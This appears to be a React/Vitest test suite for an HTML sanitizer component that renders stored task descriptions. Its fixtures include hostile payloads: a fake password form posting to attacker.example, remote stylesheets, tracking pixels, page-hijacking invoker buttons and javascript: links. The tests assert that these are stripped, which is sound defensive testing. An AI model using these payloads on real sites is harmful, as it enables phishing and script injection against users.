import { cleanup, render } from "@testing-library/react";
import { Editor, type JSONContent } from "@tiptap/react";
import StarterKit from "@tiptap/starter-kit";
import DOMPurify from "dompurify";
import { afterEach, expect, it } from "vitest";
import { SafeHtml } from "./safe-html";

afterEach(cleanup);

function rendered(html: string) {
  const { container } = render(<SafeHtml html={html} />);
  return container.firstElementChild as HTMLDivElement;
}

// Markup a stored description could use to act on the page around it:
// invokers, popovers, native dialogs, forms, overlays, tracking images and
// anything that could match or restyle app elements.
const ACTIVE_MARKUP = [
  "dialog",
  "button",
  "form",
  "input",
  "label",
  "img",
  "svg",
  "style",
  "link",
  "[command]",
  "[commandfor]",
  "[popover]",
  "[popovertarget]",
  "[popovertargetaction]",
  "[style]",
  "[class]",
  "[id]",
  "[for]",
  "[action]",
  "[target]",
].join(", ");

it("drops invokers, popovers, dialogs and forms from a stored description", () => {
  const view = rendered(
    [
      "<p>Before</p>",
      '<button command="show-modal" commandfor="own">Open</button>',
      '<button command="--hijack" commandfor="root">Hijack</button>',
      '<p command="close" commandfor="own">Any element</p>',
      '<dialog id="own"><form method="post" action="https://attacker.example/login">',
      '<input type="password" name="pw"><button>Sign in</button></form></dialog>',
      '<div popover id="pop">Popover</div>',
      '<button popovertarget="pop" popovertargetaction="show">Show</button>',
      '<label for="app-checkbox">Toggle</label>',
      '<p class="fixed inset-0 z-50" id="root" style="position:fixed">Overlay</p>',
      '<img src="https://tracker.example/pixel.gif">',
      '<a href="https://example.com" target="app-frame">Link</a>',
      "<p>After</p>",
    ].join(""),
  );
  expect(view.querySelectorAll(ACTIVE_MARKUP)).toHaveLength(0);
  expect(view.textContent).toBe(
    "BeforeOpenHijackAny elementSign inPopoverShowToggleOverlayLinkAfter",
  );
  expect(view.querySelector("a")?.getAttribute("href")).toBe(
    "https://example.com",
  );
});

it("a legacy description's style sheet does not restyle the page", () => {
  const sheetsBefore = document.styleSheets.length;
  const view = rendered(
    "<p>Legacy</p><style>body{display:none}</style>" +
      "<svg><style>#root{outline:9px solid red}</style></svg>" +
      '<link rel="stylesheet" href="https://attacker.example/x.css">',
  );
  expect(document.styleSheets.length).toBe(sheetsBefore);
  expect(getComputedStyle(document.body).display).not.toBe("none");
  expect(view.innerHTML).toBe("<p>Legacy</p>");
});

it("keeps only http, https, mailto and scheme-less link targets, as the server does", () => {
  const links = [
    ["https://example.com/a?b=1&c=2", true],
    ["http://example.com", true],
    ["mailto:someone@example.com", true],
    ["/projects/1/tasks", true],
    ["#section", true],
    ["//example.com/path", true],
    ["javascript:alert(1)", false],
    [" JaVaScRiPt:alert(1)", false],
    ["data:text/html,<p>x</p>", false],
    ["vbscript:msgbox", false],
    ["tel:+15550100", false],
    ["ftp://example.com/file", false],
    ["sms:+15550100", false],
  ] as const;
  const view = rendered(
    links.map(([href], i) => `<a href="${href}">l${i}</a>`).join(""),
  );
  const anchors = [...view.querySelectorAll("a")];
  expect(anchors).toHaveLength(links.length);
  links.forEach(([href, kept], i) => {
    expect(anchors[i].getAttribute("href")).toBe(kept ? href : null);
  });
});

// Every node and mark the task editor (StarterKit) can produce.
const EDITOR_DOCUMENT: JSONContent = {
  type: "doc",
  content: [
    ...[1, 2, 3, 4, 5, 6].map((level) => ({
      type: "heading",
      attrs: { level },
      content: [{ type: "text", text: `Heading ${level}` }],
    })),
    {
      type: "paragraph",
      content: [
        { type: "text", marks: [{ type: "bold" }], text: "bold" },
        { type: "text", text: " " },
        { type: "text", marks: [{ type: "italic" }], text: "italic" },
        { type: "text", text: " " },
        { type: "text", marks: [{ type: "strike" }], text: "strike" },
        { type: "text", text: " " },
        { type: "text", marks: [{ type: "underline" }], text: "underline" },
        { type: "text", text: " " },
        { type: "text", marks: [{ type: "code" }], text: "a < b && c" },
        { type: "hardBreak" },
        {
          type: "text",
          marks: [
            { type: "link", attrs: { href: "https://example.com/x?y=1&z=2" } },
          ],
          text: "link",
        },
        { type: "text", text: " " },
        {
          type: "text",
          marks: [{ type: "link", attrs: { href: "mailto:a@example.com" } }],
          text: "mail",
        },
        { type: "text", text: ' &  <escaped> "text"' },
      ],
    },
    { type: "paragraph" },
    {
      type: "bulletList",
      content: [
        {
          type: "listItem",
          content: [
            { type: "paragraph", content: [{ type: "text", text: "One" }] },
            {
              type: "bulletList",
              content: [
                {
                  type: "listItem",
                  content: [
                    {
                      type: "paragraph",
                      content: [{ type: "text", text: "Nested" }],
                    },
                  ],
                },
              ],
            },
          ],
        },
      ],
    },
    {
      type: "orderedList",
      attrs: { start: 3 },
      content: [
        {
          type: "listItem",
          content: [
            { type: "paragraph", content: [{ type: "text", text: "Third" }] },
          ],
        },
      ],
    },
    {
      type: "blockquote",
      content: [
        { type: "paragraph", content: [{ type: "text", text: "Quote" }] },
      ],
    },
    {
      type: "codeBlock",
      content: [{ type: "text", text: "const x = 1 < 2;\n  return <p/>;" }],
    },
    { type: "horizontalRule" },
  ],
};

function editorHtml(content: JSONContent) {
  const editor = new Editor({ extensions: [StarterKit], content });
  const html = editor.getHTML();
  editor.destroy();
  return html;
}

// Descriptions shaped like the server's sanitize-html output: the same
// allow-list, so a[target] can be present and every URL is http(s)/mailto
// or scheme-less.
const SERVER_SHAPED = [
  "<p><strong>Bold</strong> <em>italic</em> <b>b</b> <i>i</i> <code>x</code></p>",
  "<h1>One</h1><h2>Two</h2><h3>Three</h3>",
  "<ul><li>Plain</li><li><p>Para</p><ol><li>Deep</li></ol></li></ul>",
  "<blockquote><p>Quote<br />next</p></blockquote>",
  "<pre><code>if (a &lt; b) {\n  return;\n}</code></pre>",
  '<p><a href="https://example.com" target="_blank" rel="noopener noreferrer nofollow">ext</a></p>',
  '<p><a href="/projects/1">rel</a> <a href="//cdn.example.com">proto</a> <a>bare</a></p>',
  "<p>Plain &amp; &lt;escaped&gt; text</p>",
  "Loose text without a block",
  "",
];

it("renders everything the task editor writes exactly as before", () => {
  const html = editorHtml(EDITOR_DOCUMENT);
  expect(html).toContain('<ol start="3">');
  expect(html).toContain("<s>strike</s>");
  expect(rendered(html).innerHTML).toBe(DOMPurify.sanitize(html));
});

it("renders server-sanitized descriptions exactly as before", () => {
  for (const html of SERVER_SHAPED) {
    expect(rendered(html).innerHTML).toBe(DOMPurify.sanitize(html));
  }
});
